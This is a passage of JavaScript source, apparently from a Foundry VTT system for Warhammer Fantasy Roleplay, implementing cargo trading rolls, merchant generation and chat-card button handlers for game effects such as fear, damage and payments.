        let demand = Number(this.settlement.demand.find(i => i.split("+")[0].trim() == cargo.system.cargoType.value)?.split("+")[1]) || 0;

        let buyer = false;
        let halfBuyer = false;
        let quarterBuyer = this.settlement.trade || demand;

        let target;
        let roll;
        let halfRoll;

        // Case 1 - Settlement does not produce and has no surplus
        if (!produces && !surplus )
        {
            target = (this.settlement.size + demand) * 10 + (this.settlement.trade ? 30 : 0);

            roll = d100();
            halfRoll = d100();
            if (roll <= target)
            {
                buyer = true;
            }
            else if (halfRoll <= target)
            {
                halfBuyer = true;
            }
        }

        // Case 2 - Settlement produces but has no surplus
        else if (produces && !surplus)
        {

            target = this.settlement.size * (far ? 10 : 5);
            roll = d100();
            if (roll <= target)
            {
                buyer = true;
            }
        }

        // Case 3 - Settlement has surplus
        else if (surplus)
        {
            target = this.settlement.size * 5;
            roll = d100();
            if (roll <= target)
            {
                buyer = true;
            }
        }


        if (cargo.system.origin.value == this.settlement.name)
        {
            message = "<p>You cannot sell cargo in the same settlement you bought it from.</p>";
            buyer = false;
            halfBuyer = false;
            quarterBuyer = false;
        }
        else 
        {
            if (halfRoll) 
            {
                rollMessage = `Rolled ${roll}, ${halfRoll} vs ${target}`;
            }
            else 
            {
                rollMessage = `Rolled ${roll} vs ${target}`;
            }

            if (buyer) 
            {
                message = `<p>A buyer was found at <strong>${this.settlement.name}</strong>`;
            }
            else if (halfBuyer)
            {
                message = `<p>A buyer was found at <strong>${this.settlement.name}</strong>, but they are only willing to buy half the cargo.`;
            }
            else
            {
                message = `<p>No buyer was found at <strong>${this.settlement.name}</strong>`;
                if (quarterBuyer)
                {
                    message += `, but it's possible to offload to a merchant who will buy at a quarter price.</p>`;
                }
            }

            message += ` (${rollMessage})</p>`;
        }

        if (buyer || halfBuyer || quarterBuyer)
        {
            let offerPrices = game.wfrp4e.trade.tradeData[this.tradeType].offerPrice;
            let offerIndex = Math.clamped(this.settlement.wealth + this.settlement.size + demand, 0, offerPrices.length - 1);
            let offerPriceMultiplier = offerPrices[offerIndex];

            let offerPrice = price + (price * offerPriceMultiplier);
            // Add slight variation
            offerPrice += Math.round(offerPrice * ((d20() - 10) / 100));

            if (!buyer && halfBuyer)
            {
                offerPrice /= 2;
            }

            else if (!buyer && quarterBuyer)
            {
                offerPrice /= 4;
            }

            message += "<p>They are willing to pay " + `<a class="money-drag" data-amt="${offerPrice}g"><strong>${offerPrice} GC</strong></a></p>`;

            //TODO:  Add haggling (136)
        }

        return ChatMessage.create(game.wfrp4e.utility.chatDataSetup(message));
    }

    
    async createMaritimeCargoItems(cargoKeys)
    {
        let items = [];

        for (let key of cargoKeys)
        {    
            let sizeRoll = d10();

            this.rolls.push(sizeRoll);

            if (sizeRoll != 1)
            {
                let merchant = await this.createMerchant();
                let surplus = Number(this.settlement.surplus.find(i => i.split("+")[0].trim() == key)?.split("+")[1]) || 0;

                let size = (sizeRoll * 10) * (this.settlement.wealth + this.settlement.size + surplus);
                let {price, quality} = await this._computePriceQuality(key);
                
                let name = "TRADE." + key.capitalize(); // Auto-build tanslation key
                this.tradeData = { name: game.i18n.localize(name), town: this.settlement.name.capitalize(), merchant};
                
                let itemData = { system: foundry.utils.duplicate(game.system.model.Item.cargo) };
                itemData.name = game.i18n.format("TRADE.CargoItemName", { name: this.tradeData.name });
                itemData.system.cargoType.value = key;
                itemData.system.origin.value = this.tradeData.town;
                itemData.system.unitPrice.value = price;
                itemData.system.price.gc = price * size;
                itemData.system.quality.value = quality;
                itemData.system.description.value = `<p>${game.i18n.format("TRADE.CargoDescr", { name : merchant.name, town: this.tradeData.town })}</p>`;
                itemData.system.encumbrance.value = size;
                itemData.system.tradeType = this.tradeType;
                items.push(itemData);

                await this.createCargoMessage(itemData, this.tradeData);
            } 
        }
        return items;
    }

    
    //#endregion

   
    randomCargo() {
        let roll = d100();
        let cargoTable = game.wfrp4e.trade.tradeData[this.tradeType].cargoTable[this.settlement.season];
        for (let key in cargoTable) 
        {
            let cargoData = cargoTable[key];
            if (roll <= cargoData.max && roll >= cargoData.min) 
            {
                return key;
            }
        }
    }

    async rollMerchantTest(merchant)
    {
        let roll = d100();

        let SL =  Math.floor(merchant.haggle / 10) - Math.floor(roll / 10);

        if (roll <= merchant.haggle)
        {
            SL += merchant.dealmaker;
        }
        merchant.test = {roll, SL};
    }

    static async buyTrade(event) {
        let cargoData = this.getCargoData(event);
        let actor = game.user.character;
        if (!actor) return ui.notifications.error("Please assign a character.");
    
        // Perform the total amount of money to pay and get the available amount from the PCs
        let toPay;
        if (cargoData.system.price.gc.toString().includes("."))
        {
          let fraction = Number("." + cargoData.system.price.gc.toString().split(".")[1]);
          toPay = Math.trunc(cargoData.system.price.gc) + game.i18n.localize("MARKET.Abbrev.GC");
    
          let ss = 20 * fraction;
          if (ss.toString().includes("."))
          {
            fraction = Number("." + ss.toString().split(".")[1]);
            toPay += `${Math.trunc(ss)}${game.i18n.localize("MARKET.Abbrev.SS")}`;
            let bp = Math.round(12 * fraction);
            if (bp)
              toPay += `${bp}${game.i18n.localize("MARKET.Abbrev.BP")}`;
          }
          else toPay += `${ss}${game.i18n.localize("MARKET.Abbrev.SS")}`;
        }
        else toPay = `${cargoData.system.price.gc}${game.i18n.localize("MARKET.Abbrev.GC")}`;
    
    
        // Check if enough money or not
        let newMoneyInventory = game.wfrp4e.market.payCommand(toPay, actor);
        if (newMoneyInventory) {
          actor.updateEmbeddedDocuments("Item", newMoneyInventory);
    
          cargoData.type = "cargo";
          cargoData.img = "modules/wfrp4e-dotr/assets/icons/cargo.png";
          let itemCargo = await Item.create(cargoData, { temporary: true });
          itemCargo.postItem(1);
        }
      }

    async createMerchant()
    {
        let species = (await game.wfrp4e.tables.rollTable("species")).species;
        let gender = (await new Roll("1d2").roll()).total == 1 ? "male" : "female";
        let name = game.wfrp4e.names.generateName({ species, gender });
        let rolls = [d10(), d10(), d10()];
        let haggle = rolls.reduce((sum, val) => sum + val, 0) + 40;
        let dealmaker = rolls.filter(i => i == 10).length >= 2;

        let merchant = {species, gender, name, haggle, dealmaker};
        await this.rollMerchantTest(merchant);
        return merchant;
    }

    createCargoMessage(itemData, tradeData)
    {
        if (!tradeData)
        {
            throw Error("No successful trade data provided")
        }
        let message =
        `<h3>${game.i18n.format("TRADE.CargoTitle", tradeData)}</h3><br>
          <b>Enc</b>: ${itemData.system.encumbrance.value}<br>
          <b>${game.i18n.localize("TRADE.Price")}</b>: ${itemData.system.price.gc} ${game.i18n.localize("MARKET.Abbrev.GC")}<br>
          <b>${game.i18n.localize("TRADE.Quality")}</b>: ${game.i18n.localize("TRADE." + itemData.system.quality.value.capitalize())}<br><br>
          ${game.i18n.format("TRADE.MerchantData", tradeData.merchant)}<br>`;

          if (tradeData.merchant.test)
          {
           message += `<p>${game.i18n.format("TRADE.MerchantTest", tradeData.merchant.test)}</p>`;
          }

          message += `<span class="chat-card-button-area">`;
          message += `<a class='chat-card-button market-button trade-cargo-click' data-button='manageTrade'>${game.i18n.localize("TRADE.ManageCargo")}</a>`;
          message += "</span>";
          let messageData = game.wfrp4e.utility.chatDataSetup(message, "gmroll");
          messageData["flags.wfrp4e.cargoData"] = itemData;
          return ChatMessage.create(messageData);
    }


    _computeSize()
    {
        let baseSize = d100();

        if (this.settlement.trade)
        {
            let tens = Math.floor(baseSize / 10);
            let unit = baseSize % 10;
            let reversed = unit * 10 + tens;
            if (reversed > baseSize)
            {
                baseSize = reversed;
            }
        }

        let roundedSize = Math.ceil(baseSize / 10) * 10;
        return roundedSize * (this.settlement.wealth + this.settlement.size);
    }

    async _computePriceQuality(cargoKey)
    {
        let variation = (Math.ceil(CONFIG.Dice.randomUniform() * 20) - 10) / 100;
        let cargoTable = game.wfrp4e.trade.tradeData[this.tradeType].cargoTable[this.settlement.season];
        let cargoData = cargoTable[cargoKey];

        let price = (await new Roll(cargoData.price.toString()).roll()).total;
        let randomize = Math.round(price * variation);
        price += randomize;// random +/-10% variation to simulate market variance

        let quality = "average";

        // Get the price in case of brandy
        if (this.tradeType != "maritime" && (cargoKey == "wine" || cargoKey == "brandy")) {

            let wineBrandyPrice = game.wfrp4e.trade.tradeData[this.tradeType].wineBrandyPrice;
            let score = Math.ceil(CONFIG.Dice.randomUniform() * 10);
            for (let i = 0; i < wineBrandyPrice.length; i++) 
            {
                if (score <= wineBrandyPrice[i].score) 
                {
                    price = wineBrandyPrice[i].price;
                    quality = wineBrandyPrice[i].quality;
                    break; 
                }
            }
        }

        return {price, quality};
    }
}

class TradeManager
{
    gazetteers = {
        maritime : [],
        river : []
    }

    tradeData = {
        maritime : {},
        river : {}
    }

    seasons = {
        "spring": "Spring",
        "summer": "Summer",
        "autumn": "Autumn",
        "winter": "Winter"
    }

    get cargoTypes() {
        return foundry.utils.mergeObject(this.tradeData.maritime.cargoTypes || {}, this.tradeData.river.cargoTypes || {});
    }

    addGazzetteerFile(path, type)
    {
        fetch(path).then(r => r.json()).then(async records => {
            this.gazetteers[type] = this.gazetteers[type].concat(records);
        });
    }

    addTradeData(data, type)
    {
        foundry.utils.mergeObject(this.tradeData[type], data);
    }

    async getTradeType()
    {
        let buttons = {};

        if (this.tradeData.river?.dotr)
        {
            buttons.river = {
                label : game.i18n.localize("TRADE.River"),
                callback : () => "river"
            };
        }
        if (this.tradeData.maritime.soc)
        {
            buttons.maritime = {
                label : game.i18n.localize("TRADE.Maritime"),
                callback : () => "maritime"
            };
        }

        if (foundry.utils.isEmpty(buttons))
        {
            ui.notifications.error("No Trade Data found, see console for details");
            throw new Error("No Trade Data found: The Death on the Reik module is required for River trading, and the Sea of Claws module is required for Maritime trading. These modules provide the base data needed to compute trading results. ")
        }

        else if (Object.keys(buttons).length == 1)
        {
            return Object.keys(buttons)[0];
        }

        return Dialog.wait({
            title : "Trade",
            content : "Choose the type of Trade",
            buttons
        })
    }

    async attemptBuy()
    {
        let type = await this.getTradeType();
        
        if (!this.gazetteers[type]?.length)
        {
            return ui.notifications.error("TRADE.ErrorNoGazetteer");
        }

        let settlementData = await new Promise(resolve => {
            new TradeDialog(null, this.gazetteers[type], type, resolve).render(true);
        });

        let tradeGenerator = new TradeGenerator(settlementData, type);

        tradeGenerator.attemptTrade();
        
    }  
    
    
    async attemptSell(cargo)
    {
        if (!cargo.system.cargoType.value)
        {
            return ui.notifications.error("This cargo does not have a Cargo Type defined")
        }


        let type = cargo.system.tradeType;
        
        if (!this.gazetteers[type]?.length)
        {
            return ui.notifications.error("TRADE.ErrorNoGazetteer");
        }

        let settlementData = await new Promise(resolve => {
            new TradeDialog(null, this.gazetteers[type], type, resolve).render(true);
        });

        let tradeGenerator = new TradeGenerator(settlementData, type);
        
        if (type == "river")
        {
            tradeGenerator.attemptSell(cargo);
        }
        else if (type == "maritime")
        {
            let far = await Dialog.confirm({title : "Distance", content : `Is ${settlementData.name} over 100 miles from ${cargo.system.origin.value}?`});
            tradeGenerator.attemptSellMaritime(cargo, far);
        }
    }    


    // ************************* Old Code ************************************

    static async buyCargo(event) {

        let msgId = $(event.currentTarget).parents(".message").attr("data-message-id");
        let message = game.messages.get(msgId);

        let cargoData = message.getFlag("wfrp4e", "cargoData");
        let actor = game.user.character;
        if (!actor) return ui.notifications.error("Please assign a character.");
    
        // Perform the total amount of money to pay and get the available amount from the PCs
        let toPay;
        if (cargoData.system.price.gc.toString().includes("."))
        {
          let fraction = Number("." + cargoData.system.price.gc.toString().split(".")[1]);
          toPay = Math.trunc(cargoData.system.price.gc) + game.i18n.localize("MARKET.Abbrev.GC");
    
          let ss = 20 * fraction;
          if (ss.toString().includes("."))
          {
            fraction = Number("." + ss.toString().split(".")[1]);
            toPay += `${Math.trunc(ss)}${game.i18n.localize("MARKET.Abbrev.SS")}`;
            let bp = Math.round(12 * fraction);
            if (bp)
              toPay += `${bp}${game.i18n.localize("MARKET.Abbrev.BP")}`;
          }
          else toPay += `${ss}${game.i18n.localize("MARKET.Abbrev.SS")}`;
        }
        else toPay = `${cargoData.system.price.gc}${game.i18n.localize("MARKET.Abbrev.GC")}`;
    
    
        // Check if enough money or not
        let newMoneyInventory = game.wfrp4e.market.payCommand(toPay, actor);
        if (newMoneyInventory) 
        {
          actor.updateEmbeddedDocuments("Item", newMoneyInventory);
    
          cargoData.type = "cargo";
          cargoData.img = "modules/wfrp4e-dotr/assets/icons/cargo.png";
          let itemCargo = await Item.create(cargoData, { temporary: true });
          itemCargo.postItem(1);
        }
      }

      static async manageTrade(event) {
        let msgId = $(event.currentTarget).parents(".message").attr("data-message-id");
        let message = game.messages.get(msgId);

        let cargoData = message.getFlag("wfrp4e", "cargoData");

        cargoData.modifier = 0;
        let html = await renderTemplate('systems/wfrp4e/templates/apps/trade/trade-cargo.hbs', cargoData);
        new CargoDialog(html, cargoData).render(true);
      }
   
}

/**
 * ChatWFRP is the centralized object that handles all things involving rolling logic. At the base of roll evaluation, there is
 * rollTest() which provides the basics of roll evaluation - determining success, SL, etc. This function is used by more complex
 * test evaluation functions like rollWeaponTest, which calls rollTest, then extends upon it with more logic concerning weapons.
 * Another noteworthy function is renderRollCard, which is used to display the roll results of all tests. Lastly, this object
 * is where chat listeners are defined, which add interactivity to chat, usually in the form of button clickss.
 */



class ChatWFRP {


  // If content includes "@Condition[...]" add a button to apply that effect
  // Optionally provide a set of conditions
  static addEffectButtons(content, conditions = [])
  {
    // Don't add buttons if already added, or from posted items
    if (content.includes("apply-conditions") || content.includes("post-item"))
    {
      return content;
    }

    let regex = /@Condition\[(.+?)\]/gm;

    let matches = Array.from(content.matchAll(regex));

    conditions = conditions.concat(matches.map(m => m[1].toLowerCase())).filter(i => game.wfrp4e.config.conditions[i]);

    // Dedup
    conditions = conditions.filter((c, i) => conditions.indexOf(c) == i);

    if (conditions.length)
    {
      let html = `<div class="apply-conditions">`;
      conditions.forEach(c => 
          html += `<a class="chat-button apply-condition" data-cond="${c}">${game.i18n.format("CHAT.ApplyCondition", {condition: game.wfrp4e.config.conditions[c]})}</a>`
      );

      html += `</div>`;
      content += html;
    }
    return content
  }

  /**
   * Activate event listeners using the chat log html.
   * @param html {HTML}  Chat log html
   */
  static async chatListeners(html) {
    // item lookup tag looks for an item based on the location attribute (compendium), then posts that item to chat.

    // Lookp function uses specialized skill and talent lookup functions that improve searches based on specializations
    html.on("click", ".talent-lookup", async ev => {
      WFRP_Utility.findTalent(ev.target.text).then(talent => talent.sheet.render(true));
    });

    html.on("click", ".skill-lookup", async ev => {
      WFRP_Utility.findSkill(ev.target.text).then(skill => skill.sheet.render(true));
    });

    // If draggable skill/talent, right click to open sheet
    html.on("mousedown", ".talent-drag", async ev => {
      if (ev.button == 2)
        WFRP_Utility.findTalent(ev.target.text).then(talent => talent.sheet.render(true));
    });
    html.on("mousedown", ".skill-drag", async ev => {
      if (ev.button == 2)
        WFRP_Utility.findSkill(ev.target.text).then(skill => skill.sheet.render(true));
    });



    html.on("click", ".symptom-tag", WFRP_Utility.handleSymptomClick.bind(WFRP_Utility));
    html.on("click", ".condition-chat", WFRP_Utility.handleConditionClick.bind(WFRP_Utility));
    html.on("click", ".property-chat", WFRP_Utility.handlePropertyClick.bind(WFRP_Utility));
    html.on('mousedown', '.table-click', WFRP_Utility.handleTableClick.bind(WFRP_Utility));
    html.on('mousedown', '.pay-link', WFRP_Utility.handlePayClick.bind(WFRP_Utility));
    html.on('mousedown', '.credit-link', WFRP_Utility.handleCreditClick.bind(WFRP_Utility));
    html.on('mousedown', '.corruption-link', WFRP_Utility.handleCorruptionClick.bind(WFRP_Utility));
    html.on('mousedown', '.fear-link', WFRP_Utility.handleFearClick.bind(WFRP_Utility));
    html.on('mousedown', '.terror-link', WFRP_Utility.handleTerrorClick.bind(WFRP_Utility));
    html.on('mousedown', '.exp-link', WFRP_Utility.handleExpClick.bind(WFRP_Utility));
    html.on('mousedown', '.travel-click', TravelDistanceWfrp4e.handleTravelClick.bind(TravelDistanceWfrp4e));
    html.on('click', '.trade-cargo-click', TradeManager.manageTrade.bind(TradeManager));
    html.on('click', '.trade-buy-click', TradeManager.buyCargo.bind(TradeManager));

    html.on('change', '.card-edit', this._onCardEdit.bind(this));
    html.on('click', '.opposed-toggle', OpposedWFRP.opposedClicked.bind(OpposedWFRP));
    html.on("mousedown", '.overcast-button', this._onOvercastButtonClick.bind(this));
    html.on("mousedown", '.overcast-reset', this._onOvercastResetClicked.bind(this));
    html.on("click", '.vortex-movement', this._onMoveVortex.bind(this));
    html.on("click", '.unopposed', this._onUnopposedButtonClicked.bind(this));
    html.on("click", '.oppose', this._onOpposedButtonClicked.bind(this));
    html.on("click", '.market-button', this._onMarketButtonClicked.bind(this));
    html.on("click", ".haggle", this._onHaggleClicked.bind(this));
    html.on("click", ".corrupt-button", this._onCorruptButtonClicked.bind(this));
    html.on("click", ".fear-button", this._onFearButtonClicked.bind(this));
    html.on("click", ".terror-button", this._onTerrorButtonClicked.bind(this));
    html.on("click", ".experience-button", this._onExpButtonClicked.bind(this));
    html.on("click", ".condition-script", this._onConditionScriptClick.bind(this));
    html.on("click", ".apply-target-effect", this._onApplyTargetEffect.bind(this));
    html.on("click", ".place-area-effect", this._onPlaceAreaEffect.bind(this));
    html.on("click", ".attacker, .defender", this._onOpposedImgClick.bind(this));
    html.on("click", ".apply-condition", this._onApplyCondition.bind(this));
    html.on("click", ".apply-damage", this._onApplyDamageClick.bind(this));
    html.on("click", ".apply-hack", this._onApplyHackClick.bind(this));
    html.on("click", ".crew-test", this._onCrewTestClick.bind(this));

    // Respond to template button clicks
    html.on("click", '.aoe-template', event => {
      
      let actorId = event.currentTarget.dataset.actorId;
      let itemId = event.currentTarget.dataset.itemId;
      let type = event.currentTarget.dataset.type;

      let messageId = $(event.currentTarget).parents('.message').attr("data-message-id");

      AbilityTemplate.fromString(event.currentTarget.text, actorId, itemId, messageId, type=="diameter").drawPreview(event);
    });

    // Post an item property (quality/flaw) description when clicked
    html.on("click", '.item-property', event => {
      WFRP_Utility.postProperty(event.target.text);
    });


    // Change card to edit mode
    html.on('click', '.edit-toggle', ev => {
      ev.preventDefault();
      this.toggleEditable(ev.currentTarget);
    });

  }

  static _onApplyDamageClick(ev)
  {
    let message = game.messages.get($(ev.currentTarget).parents(".message").attr("data-message-id"));
    let opposedTest = message.getOpposedTest();

    if (!opposedTest.defenderTest.actor.isOwner)
      return ui.notifications.error(game.i18n.localize("ErrorDamagePermission"))

    opposedTest.defenderTest.actor.applyDamage(opposedTest, game.wfrp4e.config.DAMAGE_TYPE.NORMAL)
      .then(updateMsg => OpposedWFRP.updateOpposedMessage(updateMsg, message.id));
  }

  static async _onApplyHackClick(ev)
  {
    let message = game.messages.get($(ev.currentTarget).parents(".message").attr("data-message-id"));
    let opposedTest = message.getOpposedTest();

    if (!opposedTest.defenderTest.actor.isOwner)
      return ui.notifications.error("ErrorHackPermission", {localize : true})

    let loc = opposedTest.result.hitloc.value;
    let armour = opposedTest.defenderTest.actor.itemTypes.armour.filter(i => i.system.isEquipped && i.system.protects[loc] && i.system.currentAP[loc] > 0);
    if (armour.length)
    {
      let chosen = await ItemDialog.create(armour, 1, "Choose Armour to damage");
      if (chosen[0])
      {
        chosen[0].system.damageItem(1, [loc]);
        ChatMessage.create({content: `<p>1 Damage applied to @UUID[${chosen[0].uuid}]{${chosen[0].name}} (Hack)</p>`, speaker : ChatMessage.getSpeaker({actor : opposedTest.attackerTest.actor})});
      }
    }
    else 
    {
      return ui.notifications.error("ErrorNoArmourToDamage", {localize : true})
    }
  }


  // Respond to editing chat cards - take all inputs and call the same function used with the data filled out
  static _onCardEdit(ev) {
    let button = $(ev.currentTarget),
      messageId = button.parents('.message').attr("data-message-id"),
      message = game.messages.get(messageId);

    let test = message.getTest();
    test.context.edited = true;

    test.context.previousResult = foundry.utils.duplicate(test.result);

    test.preData[button.attr("data-edit-type")] = parseInt(ev.target.value);

    if (button.attr("data-edit-type") == "hitloc") // If changing hitloc, keep old value for roll
      test.preData.roll = $(message.content).find(".card-content.test-data").attr("data-roll");
    else // If not changing hitloc, use old value for hitloc
      test.preData.hitloc = $(message.content).find(".card-content.test-data").attr("data-loc");

    if (button.attr("data-edit-type") == "SL") // If changing SL, keep both roll and hitloc
    {
      test.preData.roll = $(message.content).find(".card-content.test-data").attr("data-roll");
      test.preData.slBonus = 0;
      test.preData.successBonus = 0;
    }

    if (button.attr("data-edit-type") == "target") // If changing target, keep both roll and hitloc
      test.preData.roll = $(message.content).find(".card-content.test-data").attr("data-roll");


    // Send message as third argument (rerenderMessage) so that the message will be updated instead of rendering a new one

    test.roll();
  }

  /**
   * Toggles a chat card from to edit mode - switches to using <input>
   * 
   * @param {Object} html  chat card html
   */
  static toggleEditable(html) {
    let elementsToToggle = $(html).parents(".chat-card").find(".display-toggle");
    if (!elementsToToggle.length)
      elementsToToggle = $(html).find(".display-toggle");

    for (let elem of elementsToToggle) {
      if (elem.style.display == "none")
        elem.style.display = "";
      else
        elem.style.display = "none";
    }
  }

  // Respond to overcast button clicks
  static _onOvercastButtonClick(event) {
    event.preventDefault();
    let msg = game.messages.get($(event.currentTarget).parents('.message').attr("data-message-id"));
    if (!msg.isOwner && !msg.isAuthor)
      return ui.notifications.error("CHAT.EditError")

    let test = msg.getTest();
    let overcastChoice = event.currentTarget.dataset.overcast;
    // Set overcast and rerender card
    test._overcast(overcastChoice);
    
    //@HOUSE
    if (game.settings.get("wfrp4e", "mooOvercasting"))
    {
      game.wfrp4e.utility.logHomebrew("mooOvercasting");
    }
    //@/HOUSE

    
  }

  // Button to reset the overcasts
  static _onOvercastResetClicked(event) {
    event.preventDefault();
    let msg = game.messages.get($(event.currentTarget).parents('.message').attr("data-message-id"));
    if (!msg.isOwner && !msg.isAuthor)
      return ui.notifications.error("CHAT.EditError")

    let test = msg.getTest();
    // Reset overcast and rerender card
    test._overcastReset();
        
    //@HOUSE
    if (game.settings.get("wfrp4e", "mooOvercasting"))
    {
      game.wfrp4e.utility.logHomebrew("mooOvercasting");
    }
    //@/HOUSE
  }

  
  static _onMoveVortex(event)
  {
    let msg = game.messages.get($(event.currentTarget).parents('.message').attr("data-message-id"));
    if (!msg.isOwner && !msg.isAuthor)
      return ui.notifications.error("CHAT.EditError")
    let test = msg.getTest();
    test.moveVortex();

  }

  static async _onCrewTestClick(event)
  {
    let messageId = ($(event.currentTarget).parents('.message').attr("data-message-id"));
    let message = game.messages.get(messageId);

    let crewTestUuid = message.getFlag("wfrp4e", "crewTestData")?.uuid;
    let crewTest = await fromUuid(crewTestUuid);
    let roleUuid = event.currentTarget.dataset.uuid;
    let vital = event.currentTarget.dataset.vital == "true";
    let role = await fromUuid(roleUuid);
    if (role)
    {
      let chosenActor = await role.actor.system.passengers.choose(role.name);
      if (chosenActor)
      {
        role.system.roll(chosenActor, {appendTitle : ` - ${vital ? game.i18n.localize("CHAT.CrewTestVital") : game.i18n.localize("CHAT.CrewTest")}`, skipTargets : true, crewTest, crewTestMessage : messageId, roleVital : vital});
      }
    }
  }

  // Proceed with an opposed test as unopposed
  static _onUnopposedButtonClicked(event) {
    event.preventDefault();
    let messageId = $(event.currentTarget).parents('.message').attr("data-message-id");
    let oppose = game.messages.get(messageId).getOppose();
    oppose.resolveUnopposed();
  }

  static _onOpposedButtonClicked(event)
  {
    let id = event.currentTarget.dataset.itemId;
    let messageId = $(event.currentTarget).parents('.message').attr("data-message-id");
    let oppose = game.messages.get(messageId).getOppose();
    oppose.resolveOpposed(id);
  }

  // Click on botton related to the market/pay system
  static _onMarketButtonClicked(event) {
    event.preventDefault();
    let msg = game.messages.get($(event.currentTarget).parents(".message").attr("data-message-id"));
    // data-button tells us what button was clicked
    switch ($(event.currentTarget).attr("data-button")) {
      case "rollAvailability":
        MarketWfrp4e.generateSettlementChoice($(event.currentTarget).attr("data-rarity"));
        break;
      case "payItem":
        if (!game.user.isGM) {
          let actor = game.user.character;
          let itemData;
          if (msg.flags.transfer)
            itemData = JSON.parse(msg.flags.transfer).payload;
          if (actor) {
            let money = MarketWfrp4e.payCommand($(event.currentTarget).attr("data-pay"), actor);
            if (money) {
              WFRP_Audio.PlayContextAudio({ item: { "type": "money" }, action: "lose" });
              actor.updateEmbeddedDocuments("Item", money);
              if (itemData) {
                actor.createEmbeddedDocuments("Item", [itemData]);
                ui.notifications.notify(game.i18n.format("MARKET.ItemAdded", { item: itemData.name, actor: actor.name }));
              }
            }
          } else {
            ui.notifications.notify(game.i18n.localize("MARKET.NotifyNoActor"));
          }
        } else {
          ui.notifications.notify(game.i18n.localize("MARKET.NotifyUserMustBePlayer"));
        }
        break;
      case "creditItem":
        if (!game.user.isGM) {
          let actor = game.user.character;
          if (actor) {
            let dataExchange = $(event.currentTarget).attr("data-amount");
            let money = MarketWfrp4e.creditCommand(dataExchange, actor);
            if (money) {
              WFRP_Audio.PlayContextAudio({ item: { type: "money" }, action: "gain" });
              actor.updateEmbeddedDocuments("Item", money);
              let instances = msg.getFlag("wfrp4e", "instances") - 1;
              let messageUpdate = {};

              // Only allow credit to be taken as many times as it has been split
              // This allows a player to take multiple times if they wish, but not more than the original total amount
              // This solution might fail if two or more players click the button at the same time and create a race condition
              if (instances <= 0)
              {
                messageUpdate = { "content": `<p><strong>${game.i18n.localize("CHAT.NoMoreLeft")}</strong></p>` };
              }
              else 
              {
                messageUpdate = { "flags.wfrp4e.instances": instances };
              }
              game.socket.emit("system.wfrp4e", { type: "updateMsg", payload: { id: msg.id, updateData: messageUpdate } });
            }
          } else {
            ui.notifications.notify(game.i18n.localize("MARKET.NotifyNoActor"));
          }
        } else {
          ui.notifications.notify(game.i18n.localize("MARKET.NotifyUserMustBePlayer"));
        }
        break;
      case "rollAvailabilityTest":
        let options = {
          settlement: $(event.currentTarget).attr("data-settlement").toLowerCase(),
          rarity: $(event.currentTarget).attr("data-rarity").toLowerCase(),
          modifier: 0
        };
        MarketWfrp4e.testForAvailability(options);
        break;
    }
  }


  static _onHaggleClicked(event) {
    let html = $(event.currentTarget).parents(".message");
    let msg = game.messages.get(html.attr("data-message-id"));
    let multiplier = $(event.currentTarget).attr("data-type") == "up" ? 1 : -1;
    let payString = html.find("[data-button=payItem]").attr("data-pay");
    let originalPayString = payString;
    if (!msg.getFlag("wfrp4e", "originalPrice"))
      msg.setFlag("wfrp4e", "originalPrice", payString);
    else
      originalPayString = msg.getFlag("wfrp4e", "originalPrice");

    let originalAmount = MarketWfrp4e.parseMoneyTransactionString(originalPayString);
    let currentAmount = MarketWfrp4e.parseMoneyTransactionString(payString);

    let originalBPAmount = originalAmount.gc * 240 + originalAmount.ss * 12 + originalAmount.bp;
    let bpAmount = currentAmount.gc * 240 + currentAmount.ss * 12 + currentAmount.bp;
    bpAmount += Math.round((originalBPAmount * .1)) * multiplier;

    let newAmount = MarketWfrp4e.makeSomeChange(bpAmount, 0);
    let newPayString = MarketWfrp4e.amountToString(newAmount);
    html.find("[data-button=payItem]")[0].setAttribute("data-pay", newPayString);
    let newContent = html.find(".message-content").html();
    newContent = newContent.replace(`${currentAmount.gc} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${currentAmount.ss} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${currentAmount.bp} ${game.i18n.localize("MARKET.Abbrev.BP")}`, `${newAmount.gc} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${newAmount.ss} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${newAmount.bp} ${game.i18n.localize("MARKET.Abbrev.BP")}`);
    msg.update({ content: newContent });
  }

  static _onCorruptButtonClicked(event) {
    let strength = $(event.currentTarget).attr("data-strength").toLowerCase();
    if (strength != "moderate" && strength != "minor" && strength != "major")
      return ui.notifications.error(game.i18n.localize("ErrorCorruption"))

    let actors = canvas.tokens.controlled.map(t => t.actor);
    if (actors.length == 0)
      actors = [game.user.character];
    if (actors.length == 0)
      return ui.notifications.error(game.i18n.localize("ErrorCharAssigned"))


    actors.forEach(a => {
      a.corruptionDialog(strength);
    });
  }

  static _onFearButtonClicked(event) {
    let value = parseInt($(event.currentTarget).attr("data-value"));
    let name = $(event.currentTarget).attr("data-name");

    let targets = canvas.tokens.controlled.concat(Array.from(game.user.targets).filter(i => !canvas.tokens.controlled.includes(i)));
    if (canvas.scene) { 
      game.user.updateTokenTargets([]);
      game.user.broadcastActivity({targets: []});
    }


    if (game.user.isGM) {
      if (!targets.length)
        return ui.notifications.warn(game.i18n.localize("ErrorTarget"))
      targets.forEach(t => {
        t.actor.applyFear(value, name);
        if (canvas.scene) {
          game.user.updateTokenTargets([]);
          game.user.broadcastActivity({ targets: [] });
        }
      });
    }
    else {
      if (!game.user.character)
        return ui.notifications.warn(game.i18n.localize("ErrorCharAssigned"))
      game.user.character.applyFear(value, name);
    }
  }

  static _onTerrorButtonClicked(event) {
    let value = parseInt($(event.currentTarget).attr("data-value"));
    let name = parseInt($(event.currentTarget).attr("data-name"));
    
    let targets = canvas.tokens.controlled.concat(Array.from(game.user.targets).filter(i => !canvas.tokens.controlled.includes(i)));
    if (canvas.scene) {
      game.user.updateTokenTargets([]);      
      game.user.broadcastActivity({ targets: [] });
    }

    if (game.user.isGM) {
      if (!targets.length)
        return ui.notifications.warn(game.i18n.localize("ErrorTarget"))
      targets.forEach(t => {
        t.actor.applyTerror(value, name);
      });
    }
    else {
      if (!game.user.character)
        return ui.notifications.warn(game.i18n.localize("ErrorCharAssigned"))
      game.user.character.applyTerror(value, name);
    }
  }

  static _onExpButtonClicked(event) {
    let amount = parseInt($(event.currentTarget).attr("data-amount"));
    let reason = $(event.currentTarget).attr("data-reason");
    let msg = game.messages.get($(event.currentTarget).parents('.message').attr("data-message-id"));
    let alreadyAwarded = msg.getFlag("wfrp4e", "experienceAwarded") || [];


    if (game.user.isGM) 
    {
      if (!game.user.targets.size)
      {
